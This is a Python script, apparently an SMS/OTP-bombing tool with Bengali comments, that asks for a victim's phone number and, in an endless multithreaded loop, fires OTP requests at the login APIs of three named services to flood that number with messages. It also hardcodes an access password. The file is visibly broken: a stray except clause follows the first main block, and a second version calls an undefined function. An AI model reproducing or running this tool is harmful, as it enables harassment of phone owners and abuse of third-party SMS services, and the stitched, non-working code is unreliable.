import requests
import time
import os
import signal
import threading
import random
from requests.exceptions import RequestException

# --- Exit Handler ---
def signal_handler(sig, frame):
    print("\n\n\033[1;31m[-] Stopping the tool... Good Bye! \033[0m")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# --- Password Protection ---
def check_password():
    os.system('clear')
    correct_pass = "saeid9.90"
    print("\033[1;36m" + "="*45)
    print("\033[1;33m          🔓 SECURITY CHECK 🔓")
    print("\033[1;36m" + "="*45 + "\033[0m")
    
    user_pass = input("\n\033[1;34m[?] Enter Password to Access: \033[0m")
    
    if user_pass == correct_pass:
        print("\n\033[1;32m[✓] Access Granted! Welcome @saeid9.90\033[0m")
        time.sleep(1.5)
        return True
    else:
        print("\n\033[1;31m[×] Access Denied! Wrong Password.\033[0m")
        exit()

# --- Professional Banner ---
def show_banner():
    os.system('clear')
    banner = """\033[1;32m
 ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
 ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                     
 ███╗   ███╗ ██████╗ ██████╗ ███████╗                
 ████╗ ████║██╔═══██╗██╔══██╗██╔════╝                
 ██╔████╔██║██║   ██║██║  ██║█████╗                  
 ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝                  
 ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗                
 ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝                
\033[1;36m-----------------------------------------------------
\033[1;33m 🌟 Developed by : @saeid9.90
\033[1;33m 🚀 Tool Version : 4.0 (Ultra Fast)
\033[1;36m-----------------------------------------------------\033[0m"""
    print(banner)

# --- High Speed API Functions ---
def api_shikho(number):
    try:
        requests.post("https://api.shikho.com/api/v1/auth/send-otp", 
                      json={"phone": number, "type": "login"}, timeout=5)
    except: pass

def api_quizgiri(number):
    try:
        requests.get(f"https://www.quizgiri.xyz/api/v1/auth/login?phone={number}", timeout=5)
    except: pass

def api_chorki(number):
    try:
        requests.post("https://api.chorki.com/api/v1/auth/send-otp", 
                      json={"phone": number}, timeout=5)
    except: pass

def start_attack():
    check_password()
    show_banner()
    
    target = input("\033[1;34m[?] Target Number (01xxx): \033[0m").strip()
    print(f"\n\033[1;33m[*] Starting Ultra-Fast Unlimited Attack on: {target}\033[0m")
    print("\033[1;31m[*] Press CTRL+C to Stop\n\033[0m")

    # আনলিমিটেড থ্রেডিং লুপ
    while True:
        # ৩টি আলাদা API ব্যবহার করে থ্রেড তৈরি
        t1 = threading.Thread(target=api_shikho, args=(target,))
        t2 = threading.Thread(target=api_quizgiri, args=(target,))
        t3 = threading.Thread(target=api_chorki, args=(target,))
        
        # সবগুলোকে একসাথে রান করা হচ্ছে
        t1.start()
        t2.start()
        t3.start()
        
        print(f"\033[1;32m[✓] Multi-API Request Sent! 🔥\033[0m")
        
        # স্পিড কন্ট্রোল: ০.১ সেকেন্ড বিরতি (যাতে আইপি ব্লক না হয়)
        time.sleep(0.1)

if __name__ == "__main__":
    start_attack()
    except:
        pass

def send_continuous_requests_fast():
    check_password()
    show_banner()
    
    while True:
        user_number = input("\033[1;34m[?] Enter Phone Number (e.g., 01xxxxxxxxx): \033[0m").strip()
        if user_number.isdigit() and len(user_number) >= 11:
            break
        else:
            print("\033[1;31m[×] Invalid Number! Try again.\033[0m")
    
    print(f"\n\033[1;36m[*] Starting Unlimited Fast Requests for {user_number}...\033[0m")
    print("\033[1;31m[*] Press CTRL+C to stop the tool.\n\033[0m")

    # আনলিমিটেড এবং দ্রুত পাঠানোর লুপ
    while True:
        # একসাথে অনেকগুলো থ্রেড কাজ করবে স্পিড বাড়ানোর জন্য
        t = threading.Thread(target=send_request, args=(user_number,))
        t.start()
        
        # অতি দ্রুত পাঠানোর জন্য ডিলে কমানো হয়েছে
        time.sleep(0.05) 

if __name__ == "__main__":
    send_continuous_requests_fast()
    
